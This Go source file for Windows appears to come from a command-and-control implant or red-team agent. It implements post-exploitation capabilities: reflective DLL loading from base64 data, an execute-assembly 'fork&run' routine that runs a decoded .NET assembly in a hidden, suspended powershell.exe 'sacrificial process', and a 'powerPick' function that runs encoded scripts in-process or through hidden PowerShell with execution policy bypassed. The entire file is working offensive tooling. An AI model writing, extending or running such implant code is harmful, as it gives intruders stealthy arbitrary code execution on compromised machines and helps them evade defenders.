//go:build windows
// +build windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func peloaderReflective(b64Data string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}
	baseAddr, err := loadDLLReflectively(data)
	if err != nil {
		return "", fmt.Errorf("reflective load failed: %v", err)
	}
	return fmt.Sprintf("DLL loaded reflectively at 0x%X", baseAddr), nil
}

var (
	procCreateProcessW                    = k32.NewProc("CreateProcessW")
	procInitializeProcThreadAttributeList = k32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = k32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = k32.NewProc("DeleteProcThreadAttributeList")
	procExpandEnvironmentStringsW         = k32.NewProc("ExpandEnvironmentStringsW")
)

const (
	procThreadAttributeParentProcess = 0x00020000
	createSuspended                  = 0x00000004
	createNoWindow                   = 0x08000000
	extendedStartupInfoPresent       = 0x00080000
)

func executeAssemblyForkRun(b64Data string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
	}
	if b64Data == "" {
		return "", fmt.Errorf("assembly data is required")
	}

	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", fmt.Errorf("base64 decode: %v", err)
	}

	tmpDir := os.Getenv("TEMP")
	assemblyPath := filepath.Join(tmpDir, fmt.Sprintf("fga_%x.dll", time.Now().UnixNano()))
	if err := os.WriteFile(assemblyPath, data, 0600); err != nil {
		return "", fmt.Errorf("write temp assembly: %v", err)
	}
	defer os.Remove(assemblyPath)

	var hRead, hWrite uintptr
	sa := &struct {
		nLength              uint32
		lpSecurityDescriptor uintptr
		bInheritHandle       uint32
	}{
		nLength: uint32(unsafe.Sizeof(struct {
			nLength              uint32
			lpSecurityDescriptor uintptr
			bInheritHandle       uint32
		}{})),
		bInheritHandle: 1,
	}
	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&hRead)),
		uintptr(unsafe.Pointer(&hWrite)),
		uintptr(unsafe.Pointer(sa)),
		0,
	)
	if ret == 0 {
		return "", fmt.Errorf("CreatePipe failed")
	}

	psCmd := fmt.Sprintf(`$a=[System.Reflection.Assembly]::LoadFile('%s');`+
		`$ep=$a.EntryPoint;`+
		`if($ep -ne $null){$ep.Invoke($null,@($null))}`+
		`else{$ran=$false;foreach($t in $a.GetTypes()){$m=$t.GetMethod('Main',[Reflection.BindingFlags]'Static,Public,NonPublic');if($m -ne $null){$m.Invoke($null,@($null));$ran=$true;break}};`+
		`if(-not $ran){throw 'assembly has no EntryPoint and no static Main method'}}`,
		assemblyPath)
	cmdLine := fmt.Sprintf(
		"powershell.exe -NoProfile -NonInteractive -Command \"%s\"",
		psCmd)
	cmdPtr, _ := syscall.UTF16PtrFromString(cmdLine)

	si := &startupInfoW{
		cb:         uint32(unsafe.Sizeof(startupInfoW{})),
		dwFlags:    0x0100,
		hStdOutput: hWrite,
		hStdError:  hWrite,
	}
	pi := &processInfo{}

	procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(cmdPtr)),
		0, 0,
		1,
		createSuspended|createNoWindow,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if pi.hProcess == 0 {
		procCloseHandle.Call(hRead)
		procCloseHandle.Call(hWrite)
		return "", fmt.Errorf("CreateProcess failed to spawn sacrificial process")
	}

	procResumeThread.Call(pi.hThread)
	procCloseHandle.Call(hWrite)

	var outputBuf bytes.Buffer
	outBuf := make([]byte, 4096)
	deadline := time.Now().Add(120 * time.Second)

	for time.Now().Before(deadline) {
		var nread uint32
		ret, _, _ := procReadFile.Call(
			hRead,
			uintptr(unsafe.Pointer(&outBuf[0])),
			uintptr(len(outBuf)),
			uintptr(unsafe.Pointer(&nread)),
			0,
		)
		if ret == 0 || nread == 0 {
			time.Sleep(50 * time.Millisecond)
			continue
		}
		outputBuf.Write(outBuf[:nread])
	}

	waitResult, _, _ := procWaitForSingleObject.Call(pi.hProcess, 5000)
	var exitCode uint32
	procGetExitCodeProcess.Call(pi.hProcess, uintptr(unsafe.Pointer(&exitCode)))

	if waitResult == 0x00000102 {
		procTerminateProcess.Call(pi.hProcess, 1)
		outputBuf.WriteString("\n[!] Execution timed out (120s), child terminated")
	}

	procCloseHandle.Call(pi.hThread)
	procCloseHandle.Call(pi.hProcess)
	procCloseHandle.Call(hRead)

	result := outputBuf.String()
	if result == "" && exitCode == 0 {
		result = "(no output)"
	}
	if exitCode != 0 && exitCode != 0xFFFFFFFF {
		if result != "" {
			result += "\n"
		}
		result += fmt.Sprintf("(exit code: %d)", exitCode)
	}
	return result, nil
}

func powerPick(script string) string {
	decoded, err := base64.StdEncoding.DecodeString(script)
	if err != nil {
		return "failed to decode script: " + err.Error()
	}
	raw := string(decoded)

	// Prefer unmanaged, in-process PowerShell when a host assembly is available;
	// this avoids spawning powershell.exe entirely.
	if clrHostInitialized && len(powershellHostAssembly) > 0 {
		out, herr := executeAssemblyInProcess(powershellHostAssembly, raw)
		if herr == nil {
			return out
		}
		if Debug {
			fmt.Printf("[clr] unmanaged powerpick failed (%v); falling back to managed powershell.exe\n", herr)
		}
	}

	u16, err := syscall.UTF16FromString(raw)
	if err != nil {
		return "failed to encode as UTF-16: " + err.Error()
	}
	uni := make([]byte, len(u16)*2)
	for i, r := range u16 {
		uni[i*2] = byte(r)
		uni[i*2+1] = byte(r >> 8)
	}
	encoded := base64.StdEncoding.EncodeToString(uni)

	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
	applyHideWindow(cmd)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err = cmd.Run()
	if err != nil {
		return out.String() + "\n[!] powerpick error: " + err.Error()
	}
	return out.String()
}
